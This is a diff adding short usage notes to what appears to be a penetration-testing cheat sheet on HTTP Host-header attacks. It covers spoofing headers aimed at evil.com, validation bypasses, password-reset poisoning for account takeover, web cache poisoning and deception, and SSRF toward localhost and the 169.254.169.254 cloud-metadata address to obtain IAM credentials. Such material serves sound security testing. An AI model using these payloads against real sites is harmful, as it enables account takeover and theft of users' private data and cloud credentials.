@@ -6,6 +6,7 @@
 ---
 
 ## 1. The host-spoofing header set (Guide §5)
+*What & when:* your first spray on any target — the full set of headers that can overwrite the "effective host" the app uses. Send each alone, then in combos, always keeping a valid `Host` so the request still routes, and watch where each lands.
 
 ```
 Host: evil.com
@@ -23,6 +24,7 @@ Host: target.com
 ```
 
 ## 2. Host-validation bypasses (Guide §7)
+*What & when:* pull these out when `Host: evil.com` is rejected (400/canonical redirect). Each exploits a *parser disagreement* — duplicate headers, port/userinfo confusion, folded lines, or a weak allowlist match — so the validator sees a good host while the app uses your bad one.
 
 ```
 # duplicate Host (front-end validates one, backend uses the other)
@@ -69,6 +71,7 @@ curl -s "$T" -H "X-Forwarded-Host: evil-hh-test.example" | grep -i 'evil-hh-test
 ```
 
 ## 4. Password-reset poisoning (Guide §11) ⭐
+*What & when:* the highest-value play — run it the moment a "forgot password" flow exists. Trigger a reset on **your own** account with a spoofed host, then read your own inbox: if the link points at your domain, the token can be stolen from any victim = ATO.
 
 ```
 # trigger a reset for YOUR OWN account with a spoofed host:
@@ -81,6 +84,7 @@ X-Forwarded-Host: evil.com
 ```
 
 ## 5. Web-cache poisoning (Guide §12) ⭐
+*What & when:* use when your host is reflected into a page that sits behind a cache/CDN. Always attach a unique `?cb=` so you only poison your own key, confirm it's cached (Age/X-Cache) and unkeyed (Param Miner), then the same payload would hit every visitor — describe that impact, don't trigger it on real pages.
 
 ```
 # 1) reflect + cache check
@@ -108,6 +112,7 @@ X-Original-URL  X-Rewrite-URL  X-Override-URL  (custom app headers)  (sometimes 
 ```
 
 ## 5c. Web Cache Deception (WCD) — read a victim's cached private page (Guide §12.2)
+*What & when:* the read-side twin — no Host header needed. Append a fake static suffix (`/x.css`) to an authenticated page; if the origin still returns the private page but the cache saves it as "a .css file," a victim's private data lands at a URL you can read. Verify with your own account in a cookie-less session.
 ```
 # the origin returns the SAME authenticated page for a path with a "static-looking" suffix, and the cache caches by
 # extension regardless of auth → the victim's PRIVATE response gets cached at a URL YOU can read.
@@ -120,6 +125,7 @@ GET /account/info;x.css                   GET /account/info%2Fx.css        GET /
 ```
 
 ## 6. Routing-based SSRF (Guide §13) ⭐
+*What & when:* when changing the host changes *which backend answers* — aim the label at internal names, `127.0.0.1`, or `169.254.169.254` (cloud metadata → IAM creds). Confirm blind reach with an `oast.pro` host and watch for the OOB hit from the front-end's IP.
 
 ```
 Host: localhost
